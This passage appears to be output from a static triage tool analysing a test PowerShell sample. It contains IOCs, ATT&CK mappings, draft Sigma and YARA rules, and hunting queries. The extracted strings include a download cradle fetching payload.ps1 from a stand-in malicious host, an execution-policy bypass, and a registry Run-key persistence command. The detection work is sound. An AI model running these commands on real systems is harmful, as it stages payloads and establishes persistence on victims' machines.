    "draftSigma": "title: ThreatRecon Encoded PowerShell\nid: 00000000-0000-4000-8000-000000000000\nstatus: experimental\ndescription: Draft Sigma rule generated from local static triage. Analyst review required before production use.\nlogsource:\n  product: windows\n  category: process_creation\ndetection:\n  selection:\n    CommandLine|contains:\n      - \"powershell\"\n      - \"-enc\"\n      - \"CurrentVersion\\\\\\\\Run\"\n      - \"HKCU:\\\\Software\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Run\"\n      - \"http://example-malicious-test.com/payload.ps1\"\n      - \"C:\\\\Users\\\\Public\\\\audit-sample2.ps1\"\n      - \"powershell.exe -NoProfile -ExecutionPolicy Bypass -EncodedCommand VwByAGkAdABlAC0ATwB1AHQAcAB1AHQAIAAiAEEAdQBkAGkAdABTAGEAbQBwAGwAZQAyACIAOwAgAHcAaABvAGEAbQBpACAALwBhAGwAbAA=\"\n      - \"New-ItemProperty -Path \\\"HKCU:\\\\Software\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Run\\\" -Name \\\"AuditSample2\\\" -Value \\\"powershell.exe -File C:\\\\Users\\\\Public\\\\audit-sample2.ps1\\\"\"\n  condition: selection\nfalsepositives:\n  - Administrative scripts\n  - Security testing\nlevel: high\ntags:\n  - attack.t1059_001\n  - attack.t1027_010\n  - attack.t1547_001\n  - attack.t1105\n  - attack.t1027\n  - attack.t1071",
    "draftYara": "rule ThreatRecon_Suspicious_Script {\n  meta:\n    description = \"Draft rule generated from local static triage\"\n    author = \"ThreatRecon\"\n    source = \"Local browser analysis\"\n    confidence = \"medium\"\n  strings:\n    $s1 = \"Encoded PowerShell command — obfuscated payload delivery\" nocase // behavior\n    $s2 = \"PowerShell execution policy bypass\" nocase // behavior\n    $s3 = \"Network download cradle — remote payload staging\" nocase // behavior\n    $s4 = \"Registry Run key modification — persistence\" nocase // behavior\n    $s5 = \"Large Base64 encoded blob — likely embedded payload\" nocase // behavior\n    $s6 = \"HKCU:\\\\Software\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Run\" nocase // artifact\n    $s7 = \"C:\\\\Users\\\\Public\\\\audit-sample2.ps1\" nocase // artifact\n    $s8 = \"http://example-malicious-test.com/payload.ps1\" nocase // network\n    $s9 = \"Invoke-WebRequest -Uri \\\"http://example-malicious-test.com/payload.ps1\\\" -OutFile \\\"$env:TEMP\\\\payload.ps1\\\"\" nocase // Network indicators\n    $s10 = \"New-ItemProperty -Path \\\"HKCU:\\\\Software\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Run\\\" -Name \\\"AuditSample2\\\" -Value \\\"powe\" nocase // Registry strings\n    $s11 = \"# ThreatRecon audit sample 2 - benign PowerShell text only\" nocase // PowerShell strings\n    $s12 = \"powershell.exe -NoProfile -ExecutionPolicy Bypass -EncodedCommand VwByAGkAdABlAC0ATwB1AHQAcAB1AHQAIAAiAEEAdQBkAGkAdABTAG\" nocase // PowerShell strings\n  condition:\n    3 of them\n}",
    "splunk": [
      "index=* \"http://example-malicious-test.com/payload.ps1\"",
      "index=* \"# ThreatRecon audit sample 2 - benign PowerShell text only\"",
      "index=* \"powershell.exe -NoProfile -ExecutionPolicy Bypass -EncodedCommand VwByAGkAdABlAC0ATwB1AHQAcAB1AHQAIAAiAEEAdQBkAGkAdABTAG\"",
      "index=* \"New-ItemProperty -Path \\\"HKCU:\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\\" -Name \\\"AuditSample2\\\" -Value \\\"powershell.exe\"",
      "index=* \"Invoke-WebRequest -Uri \\\"http://example-malicious-test.com/payload.ps1\\\" -OutFile \\\"$env:TEMP\\payload.ps1\\\"\""
    ],
    "defender": [
      "DeviceProcessEvents\n| where ProcessCommandLine contains \"http://example-malicious-test.com/payload.ps1\"",
      "DeviceProcessEvents\n| where ProcessCommandLine contains \"# ThreatRecon audit sample 2 - benign PowerShell text only\"",
      "DeviceProcessEvents\n| where ProcessCommandLine contains \"powershell.exe -NoProfile -ExecutionPolicy Bypass -EncodedCommand VwByAGkAdABlAC0ATwB1AHQAcAB1AHQAIAAiAEEAdQBkAGkAdABTAG\"",
      "DeviceProcessEvents\n| where ProcessCommandLine contains \"New-ItemProperty -Path \\\"HKCU:\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\\" -Name \\\"AuditSample2\\\" -Value \\\"powershell.exe\"",
      "DeviceProcessEvents\n| where ProcessCommandLine contains \"Invoke-WebRequest -Uri \\\"http://example-malicious-test.com/payload.ps1\\\" -OutFile \\\"$env:TEMP\\payload.ps1\\\"\""
    ],
    "elastic": [
      "process.command_line : \"*http://example-malicious-test.com/payload.ps1*\"",
      "process.command_line : \"*# ThreatRecon audit sample 2 - benign PowerShell text only*\"",
      "process.command_line : \"*powershell.exe -NoProfile -ExecutionPolicy Bypass -EncodedCommand VwByAGkAdABlAC0ATwB1AHQAcAB1AHQAIAAiAEEAdQBkAGkAdABTAG*\"",
      "process.command_line : \"*New-ItemProperty -Path \\\"HKCU:\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\\" -Name \\\"AuditSample2\\\" -Value \\\"powershell.exe*\"",
      "process.command_line : \"*Invoke-WebRequest -Uri \\\"http://example-malicious-test.com/payload.ps1\\\" -OutFile \\\"$env:TEMP\\payload.ps1\\\"*\""
    ],
    "firewallBlocklist": [
      "http://example-malicious-test.com/payload.ps1"
    ],
    "dnsBlocklist": [],
    "edrHashHunts": []
  }
}
```

## 9. Analyst Report Exports
### Markdown
```markdown
# ThreatRecon Triage Report - sample2.ps1

## Static Metadata
- Byte length: 622
- MD5: 08c3027ea885fe04717c231108b0c670
- SHA-1: 0fb58ff24d3a0f6ce9a271a721eacfc9c426d7a4
- SHA-256: ce779811ef591d617dd5154e21b10c650703ee354abd4818d64f540e1083e213
- Entropy: 5.296 bits/byte
- PE type: No PE structure detected
- PE imports: none parsed
- Suspicious API strings: none

## IOCs
### urls
http://example-malicious-test.com/payload.ps1

### registry
HKCU:\Software\Microsoft\Windows\CurrentVersion\Run

### paths
C:\Users\Public\audit-sample2.ps1

## MITRE ATT&CK
- Defense Evasion | T1027.010 Command Obfuscation | Evidence: Encoded PowerShell command — obfuscated payload delivery | Confidence: High
- Execution | T1059.001 PowerShell | Evidence: PowerShell execution policy bypass | Confidence: High
- Command and Control | T1105 Ingress Tool Transfer | Evidence: Network download cradle — remote payload staging | Confidence: High
- Persistence | T1547.001 Registry Run Keys | Evidence: Registry Run key modification — persistence | Confidence: High
- Defense Evasion | T1027 Obfuscated Files or Info | Evidence: Large Base64 encoded blob — likely embedded payload | Confidence: Medium
- Command and Control | T1071 Application Layer Protocol | Evidence: Technique inferred from IOC or static context | Confidence: Medium

## YARA Draft
`\`\`yara
rule ThreatRecon_Suspicious_Script {
  meta:
    description = "Draft rule generated from local static triage"
    author = "ThreatRecon"
    source = "Local browser analysis"
    confidence = "medium"
  strings:
    $s1 = "Encoded PowerShell command — obfuscated payload delivery" nocase // behavior
    $s2 = "PowerShell execution policy bypass" nocase // behavior
    $s3 = "Network download cradle — remote payload staging" nocase // behavior
    $s4 = "Registry Run key modification — persistence" nocase // behavior
    $s5 = "Large Base64 encoded blob — likely embedded payload" nocase // behavior
    $s6 = "HKCU:\\Software\\Microsoft\\Windows\\CurrentVersion\\Run" nocase // artifact
    $s7 = "C:\\Users\\Public\\audit-sample2.ps1" nocase // artifact
    $s8 = "http://example-malicious-test.com/payload.ps1" nocase // network
    $s9 = "Invoke-WebRequest -Uri \"http://example-malicious-test.com/payload.ps1\" -OutFile \"$env:TEMP\\payload.ps1\"" nocase // Network indicators
    $s10 = "New-ItemProperty -Path \"HKCU:\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\" -Name \"AuditSample2\" -Value \"powe" nocase // Registry strings
    $s11 = "# ThreatRecon audit sample 2 - benign PowerShell text only" nocase // PowerShell strings
    $s12 = "powershell.exe -NoProfile -ExecutionPolicy Bypass -EncodedCommand VwByAGkAdABlAC0ATwB1AHQAcAB1AHQAIAAiAEEAdQBkAGkAdABTAG" nocase // PowerShell strings
  condition:
    3 of them
}
`\`\`

## Sigma Draft
`\`\`yaml
title: ThreatRecon Encoded PowerShell
id: 00000000-0000-4000-8000-000000000000
status: experimental
description: Draft Sigma rule generated from local static triage. Analyst review required before production use.
logsource:
  product: windows
  category: process_creation
detection:
  selection:
    CommandLine|contains:
      - "powershell"
      - "-enc"
      - "CurrentVersion\\\\Run"
      - "HKCU:\\Software\\Microsoft\\Windows\\CurrentVersion\\Run"
      - "http://example-malicious-test.com/payload.ps1"
      - "C:\\Users\\Public\\audit-sample2.ps1"
      - "powershell.exe -NoProfile -ExecutionPolicy Bypass -EncodedCommand VwByAGkAdABlAC0ATwB1AHQAcAB1AHQAIAAiAEEAdQBkAGkAdABTAGEAbQBwAGwAZQAyACIAOwAgAHcAaABvAGEAbQBpACAALwBhAGwAbAA="
      - "New-ItemProperty -Path \"HKCU:\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\" -Name \"AuditSample2\" -Value \"powershell.exe -File C:\\Users\\Public\\audit-sample2.ps1\""
  condition: selection
falsepositives:
  - Administrative scripts
  - Security testing
level: high
tags:
  - attack.t1059_001
  - attack.t1027_010
  - attack.t1547_001
  - attack.t1105
  - attack.t1027
  - attack.t1071
`\`\`

## Hunting Queries
- http://example-malicious-test.com/payload.ps1
  - Splunk: index=* "http://example-malicious-test.com/payload.ps1"
  - Defender: DeviceProcessEvents | where ProcessCommandLine contains "http://example-malicious-test.com/payload.ps1"
  - Elastic: process.command_line : "*http://example-malicious-test.com/payload.ps1*"
- # ThreatRecon audit sample 2 - benign PowerShell text only
  - Splunk: index=* "# ThreatRecon audit sample 2 - benign PowerShell text only"
  - Defender: DeviceProcessEvents | where ProcessCommandLine contains "# ThreatRecon audit sample 2 - benign PowerShell text only"
  - Elastic: process.command_line : "*# ThreatRecon audit sample 2 - benign PowerShell text only*"
- powershell.exe -NoProfile -ExecutionPolicy Bypass -EncodedCommand VwByAGkAdABlAC0ATwB1AHQAcAB1AHQAIAAiAEEAdQBkAGkAdABTAG
  - Splunk: index=* "powershell.exe -NoProfile -ExecutionPolicy Bypass -EncodedCommand VwByAGkAdABlAC0ATwB1AHQAcAB1AHQAIAAiAEEAdQBkAGkAdABTAG"
  - Defender: DeviceProcessEvents | where ProcessCommandLine contains "powershell.exe -NoProfile -ExecutionPolicy Bypass -EncodedCommand VwByAGkAdABlAC0ATwB1AHQAcAB1AHQAIAAiAEEAdQBkAGkAdABTAG"
  - Elastic: process.command_line : "*powershell.exe -NoProfile -ExecutionPolicy Bypass -EncodedCommand VwByAGkAdABlAC0ATwB1AHQAcAB1AHQAIAAiAEEAdQBkAGkAdABTAG*"
- New-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run" -Name "AuditSample2" -Value "powershell.exe
  - Splunk: index=* "New-ItemProperty -Path \"HKCU:\Software\Microsoft\Windows\CurrentVersion\Run\" -Name \"AuditSample2\" -Value \"powershell.exe"
  - Defender: DeviceProcessEvents | where ProcessCommandLine contains "New-ItemProperty -Path \"HKCU:\Software\Microsoft\Windows\CurrentVersion\Run\" -Name \"AuditSample2\" -Value \"powershell.exe"
  - Elastic: process.command_line : "*New-ItemProperty -Path \"HKCU:\Software\Microsoft\Windows\CurrentVersion\Run\" -Name \"AuditSample2\" -Value \"powershell.exe*"
- Invoke-WebRequest -Uri "http://example-malicious-test.com/payload.ps1" -OutFile "$env:TEMP\payload.ps1"
  - Splunk: index=* "Invoke-WebRequest -Uri \"http://example-malicious-test.com/payload.ps1\" -OutFile \"$env:TEMP\payload.ps1\""
  - Defender: DeviceProcessEvents | where ProcessCommandLine contains "Invoke-WebRequest -Uri \"http://example-malicious-test.com/payload.ps1\" -OutFile \"$env:TEMP\payload.ps1\""
  - Elastic: process.command_line : "*Invoke-WebRequest -Uri \"http://example-malicious-test.com/payload.ps1\" -OutFile \"$env:TEMP\payload.ps1\"*"
```
### JSON
```json
{
  "sample": "sample2.ps1",
  "byteLength": 622,
  "hashes": {
    "md5": "08c3027ea885fe04717c231108b0c670",
    "sha1": "0fb58ff24d3a0f6ce9a271a721eacfc9c426d7a4",
    "sha256": "ce779811ef591d617dd5154e21b10c650703ee354abd4818d64f540e1083e213"
  },
  "entropy": 5.295691098654294,
  "score": 81,
  "scoreBreakdown": {
    "total": 81,
    "beh": 50,
    "iocScore": 4,
    "yaraScore": 8,
    "entScore": 3,
    "deobfScore": 4,
    "capScore": 12
  },
  "verdict": "CRITICAL THREAT",
  "staticMetadata": {
    "byteLength": 622,
    "lines": 6,
    "entropy": 5.295691098654294,
    "peTriage": {
      "detected": false,
      "hasMZ": false,
      "hasPE": false,
      "fileType": "No PE structure detected",
      "architecture": "Not available",
      "timestamp": null,
      "subsystem": null,
      "dllCharacteristics": [],
      "imageBase": null,
      "entryPointRva": null,
      "sections": [],
      "imports": [],
      "importDlls": [],
      "exports": [],
      "suspiciousApiStrings": [],
      "packedIndicators": [],
      "warnings": [],
      "realImportTableParsed": false,
      "packerHints": []
    }
  },
  "printableStrings": [
    "# ThreatRecon audit sample 2 - benign PowerShell text only",
    "$Encoded = \"VwByAGkAdABlAC0ATwB1AHQAcAB1AHQAIAAiAEEAdQBkAGkAdABTAGEAbQBwAGwAZQAyACIAOwAgAHcAaABvAGEAbQBpACAALwBhAGwAbAA=\"",
    "powershell.exe -NoProfile -ExecutionPolicy Bypass -EncodedCommand VwByAGkAdABlAC0ATwB1AHQAcAB1AHQAIAAiAEEAdQBkAGkAdABTAGEAbQBwAGwAZQAyACIAOwAgAHcAaABvAGEAbQBpACAALwBhAGwAbAA=",
    "New-ItemProperty -Path \"HKCU:\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\" -Name \"AuditSample2\" -Value \"powershell.exe -File C:\\Users\\Public\\audit-sample2.ps1\"",
    "Invoke-WebRequest -Uri \"http://example-malicious-test.com/payload.ps1\" -OutFile \"$env:TEMP\\payload.ps1\""
  ],
  "classifiedStrings": [
    {
      "type": "evasion",
      "val": "powershell.exe -NoProfile -ExecutionPolicy Bypass -EncodedCommand VwByAGkAdABlAC0ATwB1AHQA"
    },
    {
      "type": "network",
      "val": "Invoke-WebRequest -Uri \"http://example-malicious-test.com/payload.ps1\" -OutFile \"$env:TEMP"
    }
  ],
  "stringsIntelligence": [
    {
      "name": "Network indicators",
      "confidence": "High",
      "explanation": "Static string category. Analyst validation required.",
      "items": [
        "Invoke-WebRequest -Uri \"http://example-malicious-test.com/payload.ps1\" -OutFile \"$env:TEMP\\payload.ps1\""
      ]
    },
    {
      "name": "URLs and domains",
      "confidence": "High",
      "explanation": "Static string category. Analyst validation required.",
      "items": [
        "Invoke-WebRequest -Uri \"http://example-malicious-test.com/payload.ps1\" -OutFile \"$env:TEMP\\payload.ps1\""
      ]
    },
    {
      "name": "Registry strings",
      "confidence": "High",
      "explanation": "Static string category. Analyst validation required.",
      "items": [
        "New-ItemProperty -Path \"HKCU:\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\" -Name \"AuditSample2\" -Value \"powershell.exe -File C:\\Users\\Public\\audit-sample2.ps1\""
      ]
    },
    {
      "name": "File paths",
      "confidence": "Medium",
      "explanation": "Static string category. Analyst validation required.",
      "items": [
        "New-ItemProperty -Path \"HKCU:\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\" -Name \"AuditSample2\" -Value \"powershell.exe -File C:\\Users\\Public\\audit-sample2.ps1\""
      ]
    },
    {
      "name": "PowerShell strings",
      "confidence": "High",
      "explanation": "Static string category. Analyst validation required.",
      "items": [
        "# ThreatRecon audit sample 2 - benign PowerShell text only",
        "powershell.exe -NoProfile -ExecutionPolicy Bypass -EncodedCommand VwByAGkAdABlAC0ATwB1AHQAcAB1AHQAIAAiAEEAdQBkAGkAdABTAGEAbQBwAGwAZQAyACIAOwAgAHcAaABvAGEAbQBpACAALwBhAGwAbAA=",
        "New-ItemProperty -Path \"HKCU:\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\" -Name \"AuditSample2\" -Value \"powershell.exe -File C:\\Users\\Public\\audit-sample2.ps1\"",
        "Invoke-WebRequest -Uri \"http://example-malicious-test.com/payload.ps1\" -OutFile \"$env:TEMP\\payload.ps1\""
      ]
    },
    {
      "name": "Persistence strings",
      "confidence": "High",
      "explanation": "Static string category. Analyst validation required.",
      "items": [
        "New-ItemProperty -Path \"HKCU:\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\" -Name \"AuditSample2\" -Value \"powershell.exe -File C:\\Users\\Public\\audit-sample2.ps1\""
      ]
    },
    {
      "name": "Suspicious commands",
      "confidence": "High",
      "explanation": "Static string category. Analyst validation required.",
      "items": [
        "# ThreatRecon audit sample 2 - benign PowerShell text only",
        "powershell.exe -NoProfile -ExecutionPolicy Bypass -EncodedCommand VwByAGkAdABlAC0ATwB1AHQAcAB1AHQAIAAiAEEAdQBkAGkAdABTAGEAbQBwAGwAZQAyACIAOwAgAHcAaABvAGEAbQBpACAALwBhAGwAbAA=",
        "New-ItemProperty -Path \"HKCU:\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\" -Name \"AuditSample2\" -Value \"powershell.exe -File C:\\Users\\Public\\audit-sample2.ps1\""
      ]
    }
  ],
  "suspiciousApiDetection": {
    "suspiciousApiStrings": [],
    "apiRisk": []
  },
  "iocs": {
    "ips": [],
    "localIndicators": [],
    "urls": [
      "http://example-malicious-test.com/payload.ps1"
    ],
    "domains": [],
    "onion": [],
    "md5": [],
    "sha1": [],
    "sha256": [],
    "emails": [],
    "registry": [
      "HKCU:\\Software\\Microsoft\\Windows\\CurrentVersion\\Run"
    ],
    "paths": [
      "C:\\Users\\Public\\audit-sample2.ps1"
    ],
    "btc": [],
    "cve": [],
    "mutex": []
  },
  "iocActionability": [
    {
      "type": "url",
      "value": "http://example-malicious-test.com/payload.ps1",
      "confidence": "Medium",
      "actionable": true,
      "reason": "URL indicator requiring validation.",
      "recommendedAction": "Validate reputation and consider DNS/proxy/URL block only if confirmed malicious."
    },
    {
      "type": "registry_key",
      "value": "HKCU:\\Software\\Microsoft\\Windows\\CurrentVersion\\Run",
      "confidence": "High",
      "actionable": false,
      "reason": "Registry path is a host hunt indicator",
      "recommendedAction": "Hunt endpoint telemetry and autoruns."
    },
    {
      "type": "file_path",
      "value": "C:\\Users\\Public\\audit-sample2.ps1",
      "confidence": "Medium",
      "actionable": false,
      "reason": "File path is a host hunt indicator",
      "recommendedAction": "Hunt endpoint file/process telemetry."
    }
  ],
  "mitre": [
    "T1027.010",
    "T1059.001",
    "T1105",
    "T1547.001",
    "T1027",
    "T1071"
  ],
  "attackTable": [
    {
      "tactic": "Defense Evasion",
      "techniqueId": "T1027.010",
      "techniqueName": "Command Obfuscation",
      "observedEvidence": "Encoded PowerShell command — obfuscated payload delivery",
      "confidence": "High",
      "detectionIdea": "Hunt for evidence containing \"Encoded PowerShell command — obfuscated payload delivery\" in process, registry, and script telemetry."
    },
    {
      "tactic": "Execution",
      "techniqueId": "T1059.001",
      "techniqueName": "PowerShell",
      "observedEvidence": "PowerShell execution policy bypass",
      "confidence": "High",
      "detectionIdea": "Monitor PowerShell command line arguments, encoded commands, hidden windows, and suspicious parents."
    },
    {
      "tactic": "Command and Control",
      "techniqueId": "T1105",
      "techniqueName": "Ingress Tool Transfer",
      "observedEvidence": "Network download cradle — remote payload staging",
      "confidence": "High",
      "detectionIdea": "Hunt for command lines or processes contacting extracted network IOCs."
    },
    {
      "tactic": "Persistence",
      "techniqueId": "T1547.001",
      "techniqueName": "Registry Run Keys",
      "observedEvidence": "Registry Run key modification — persistence",
      "confidence": "High",
      "detectionIdea": "Monitor registry Run and Winlogon key creation or modification."
    },
    {
      "tactic": "Defense Evasion",
      "techniqueId": "T1027",
      "techniqueName": "Obfuscated Files or Info",
      "observedEvidence": "Large Base64 encoded blob — likely embedded payload",
      "confidence": "Medium",
      "detectionIdea": "Hunt for evidence containing \"Large Base64 encoded blob — likely embedded payload\" in process, registry, and script telemetry."
    },
    {
      "tactic": "Command and Control",
      "techniqueId": "T1071",
      "techniqueName": "Application Layer Protocol",
      "observedEvidence": "Technique inferred from IOC or static context",
      "confidence": "Medium",
      "detectionIdea": "Hunt for command lines or processes contacting extracted network IOCs."
    }
  ],
  "attackTimeline": [
    {
      "stage": "Execution",
      "evidence": [
        "Encoded PowerShell command — obfuscated payload delivery",
        "PowerShell execution policy bypass"
      ],
      "confidence": "High",
      "technique": "T1027.010",
      "validation": "Review process creation and script block logs."
    },
    {
      "stage": "Defense Evasion",
      "evidence": [
        "Encoded PowerShell command — obfuscated payload delivery",
        "PowerShell execution policy bypass",
        "Large Base64 encoded blob — likely embedded payload"
      ],
      "confidence": "High",
      "technique": "T1027.010",
      "validation": "Check security control tampering and obfuscation telemetry."
    },
    {
      "stage": "Payload Download",
      "evidence": [
        "Network download cradle — remote payload staging"
      ],
      "confidence": "Medium",
      "technique": "T1105",
      "validation": "Validate network connections and downloaded file hashes."
    },
    {
      "stage": "Persistence",
      "evidence": [
        "Static text matched persistence keywords."
      ],
      "confidence": "Medium",
      "technique": null,
      "validation": "Inspect autoruns, scheduled tasks, services, and shell profiles."
    }
  ],
  "yaraHits": [
    {
      "name": "Registry_Run_Persistence",
      "desc": "Registry-based persistence via Run key or Winlogon hijack"
    }
  ],
  "draftYara": "rule ThreatRecon_Suspicious_Script {\n  meta:\n    description = \"Draft rule generated from local static triage\"\n    author = \"ThreatRecon\"\n    source = \"Local browser analysis\"\n    confidence = \"medium\"\n  strings:\n    $s1 = \"Encoded PowerShell command — obfuscated payload delivery\" nocase // behavior\n    $s2 = \"PowerShell execution policy bypass\" nocase // behavior\n    $s3 = \"Network download cradle — remote payload staging\" nocase // behavior\n    $s4 = \"Registry Run key modification — persistence\" nocase // behavior\n    $s5 = \"Large Base64 encoded blob — likely embedded payload\" nocase // behavior\n    $s6 = \"HKCU:\\\\Software\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Run\" nocase // artifact\n    $s7 = \"C:\\\\Users\\\\Public\\\\audit-sample2.ps1\" nocase // artifact\n    $s8 = \"http://example-malicious-test.com/payload.ps1\" nocase // network\n    $s9 = \"Invoke-WebRequest -Uri \\\"http://example-malicious-test.com/payload.ps1\\\" -OutFile \\\"$env:TEMP\\\\payload.ps1\\\"\" nocase // Network indicators\n    $s10 = \"New-ItemProperty -Path \\\"HKCU:\\\\Software\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Run\\\" -Name \\\"AuditSample2\\\" -Value \\\"powe\" nocase // Registry strings\n    $s11 = \"# ThreatRecon audit sample 2 - benign PowerShell text only\" nocase // PowerShell strings\n    $s12 = \"powershell.exe -NoProfile -ExecutionPolicy Bypass -EncodedCommand VwByAGkAdABlAC0ATwB1AHQAcAB1AHQAIAAiAEEAdQBkAGkAdABTAG\" nocase // PowerShell strings\n  condition:\n    3 of them\n}",
  "draftSigma": "title: ThreatRecon Encoded PowerShell\nid: 00000000-0000-4000-8000-000000000000\nstatus: experimental\ndescription: Draft Sigma rule generated from local static triage. Analyst review required before production use.\nlogsource:\n  product: windows\n  category: process_creation\ndetection:\n  selection:\n    CommandLine|contains:\n      - \"powershell\"\n      - \"-enc\"\n      - \"CurrentVersion\\\\\\\\Run\"\n      - \"HKCU:\\\\Software\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Run\"\n      - \"http://example-malicious-test.com/payload.ps1\"\n      - \"C:\\\\Users\\\\Public\\\\audit-sample2.ps1\"\n      - \"powershell.exe -NoProfile -ExecutionPolicy Bypass -EncodedCommand VwByAGkAdABlAC0ATwB1AHQAcAB1AHQAIAAiAEEAdQBkAGkAdABTAGEAbQBwAGwAZQAyACIAOwAgAHcAaABvAGEAbQBpACAALwBhAGwAbAA=\"\n      - \"New-ItemProperty -Path \\\"HKCU:\\\\Software\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Run\\\" -Name \\\"AuditSample2\\\" -Value \\\"powershell.exe -File C:\\\\Users\\\\Public\\\\audit-sample2.ps1\\\"\"\n  condition: selection\nfalsepositives:\n  - Administrative scripts\n  - Security testing\nlevel: high\ntags:\n  - attack.t1059_001\n  - attack.t1027_010\n  - attack.t1547_001\n  - attack.t1105\n  - attack.t1027\n  - attack.t1071",
  "huntingQueries": [
    {
      "value": "http://example-malicious-test.com/payload.ps1",
      "splunk": "index=* \"http://example-malicious-test.com/payload.ps1\"",
      "defender": "DeviceProcessEvents\n| where ProcessCommandLine contains \"http://example-malicious-test.com/payload.ps1\"",
      "elastic": "process.command_line : \"*http://example-malicious-test.com/payload.ps1*\""
    },
    {
      "value": "# ThreatRecon audit sample 2 - benign PowerShell text only",
      "splunk": "index=* \"# ThreatRecon audit sample 2 - benign PowerShell text only\"",
      "defender": "DeviceProcessEvents\n| where ProcessCommandLine contains \"# ThreatRecon audit sample 2 - benign PowerShell text only\"",
      "elastic": "process.command_line : \"*# ThreatRecon audit sample 2 - benign PowerShell text only*\""
    },
    {
      "value": "powershell.exe -NoProfile -ExecutionPolicy Bypass -EncodedCommand VwByAGkAdABlAC0ATwB1AHQAcAB1AHQAIAAiAEEAdQBkAGkAdABTAG",
      "splunk": "index=* \"powershell.exe -NoProfile -ExecutionPolicy Bypass -EncodedCommand VwByAGkAdABlAC0ATwB1AHQAcAB1AHQAIAAiAEEAdQBkAGkAdABTAG\"",
      "defender": "DeviceProcessEvents\n| where ProcessCommandLine contains \"powershell.exe -NoProfile -ExecutionPolicy Bypass -EncodedCommand VwByAGkAdABlAC0ATwB1AHQAcAB1AHQAIAAiAEEAdQBkAGkAdABTAG\"",
      "elastic": "process.command_line : \"*powershell.exe -NoProfile -ExecutionPolicy Bypass -EncodedCommand VwByAGkAdABlAC0ATwB1AHQAcAB1AHQAIAAiAEEAdQBkAGkAdABTAG*\""
    },
    {
      "value": "New-ItemProperty -Path \"HKCU:\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\" -Name \"AuditSample2\" -Value \"powershell.exe",
      "splunk": "index=* \"New-ItemProperty -Path \\\"HKCU:\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\\" -Name \\\"AuditSample2\\\" -Value \\\"powershell.exe\"",
      "defender": "DeviceProcessEvents\n| where ProcessCommandLine contains \"New-ItemProperty -Path \\\"HKCU:\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\\" -Name \\\"AuditSample2\\\" -Value \\\"powershell.exe\"",
      "elastic": "process.command_line : \"*New-ItemProperty -Path \\\"HKCU:\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\\" -Name \\\"AuditSample2\\\" -Value \\\"powershell.exe*\""
    },
    {
      "value": "Invoke-WebRequest -Uri \"http://example-malicious-test.com/payload.ps1\" -OutFile \"$env:TEMP\\payload.ps1\"",
      "splunk": "index=* \"Invoke-WebRequest -Uri \\\"http://example-malicious-test.com/payload.ps1\\\" -OutFile \\\"$env:TEMP\\payload.ps1\\\"\"",
      "defender": "DeviceProcessEvents\n| where ProcessCommandLine contains \"Invoke-WebRequest -Uri \\\"http://example-malicious-test.com/payload.ps1\\\" -OutFile \\\"$env:TEMP\\payload.ps1\\\"\"",
      "elastic": "process.command_line : \"*Invoke-WebRequest -Uri \\\"http://example-malicious-test.com/payload.ps1\\\" -OutFile \\\"$env:TEMP\\payload.ps1\\\"*\""
    }
  ],
  "detectionEngineering": {
    "draftSigma": "title: ThreatRecon Encoded PowerShell\nid: 00000000-0000-4000-8000-000000000000\nstatus: experimental\ndescription: Draft Sigma rule generated from local static triage. Analyst review required before production use.\nlogsource:\n  product: windows\n  category: process_creation\ndetection:\n  selection:\n    CommandLine|contains:\n      - \"powershell\"\n      - \"-enc\"\n      - \"CurrentVersion\\\\\\\\Run\"\n      - \"HKCU:\\\\Software\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Run\"\n      - \"http://example-malicious-test.com/payload.ps1\"\n      - \"C:\\\\Users\\\\Public\\\\audit-sample2.ps1\"\n      - \"powershell.exe -NoProfile -ExecutionPolicy Bypass -EncodedCommand VwByAGkAdABlAC0ATwB1AHQAcAB1AHQAIAAiAEEAdQBkAGkAdABTAGEAbQBwAGwAZQAyACIAOwAgAHcAaABvAGEAbQBpACAALwBhAGwAbAA=\"\n      - \"New-ItemProperty -Path \\\"HKCU:\\\\Software\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Run\\\" -Name \\\"AuditSample2\\\" -Value \\\"powershell.exe -File C:\\\\Users\\\\Public\\\\audit-sample2.ps1\\\"\"\n  condition: selection\nfalsepositives:\n  - Administrative scripts\n  - Security testing\nlevel: high\ntags:\n  - attack.t1059_001\n  - attack.t1027_010\n  - attack.t1547_001\n  - attack.t1105\n  - attack.t1027\n  - attack.t1071",
    "draftYara": "rule ThreatRecon_Suspicious_Script {\n  meta:\n    description = \"Draft rule generated from local static triage\"\n    author = \"ThreatRecon\"\n    source = \"Local browser analysis\"\n    confidence = \"medium\"\n  strings:\n    $s1 = \"Encoded PowerShell command — obfuscated payload delivery\" nocase // behavior\n    $s2 = \"PowerShell execution policy bypass\" nocase // behavior\n    $s3 = \"Network download cradle — remote payload staging\" nocase // behavior\n    $s4 = \"Registry Run key modification — persistence\" nocase // behavior\n    $s5 = \"Large Base64 encoded blob — likely embedded payload\" nocase // behavior\n    $s6 = \"HKCU:\\\\Software\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Run\" nocase // artifact\n    $s7 = \"C:\\\\Users\\\\Public\\\\audit-sample2.ps1\" nocase // artifact\n    $s8 = \"http://example-malicious-test.com/payload.ps1\" nocase // network\n    $s9 = \"Invoke-WebRequest -Uri \\\"http://example-malicious-test.com/payload.ps1\\\" -OutFile \\\"$env:TEMP\\\\payload.ps1\\\"\" nocase // Network indicators\n    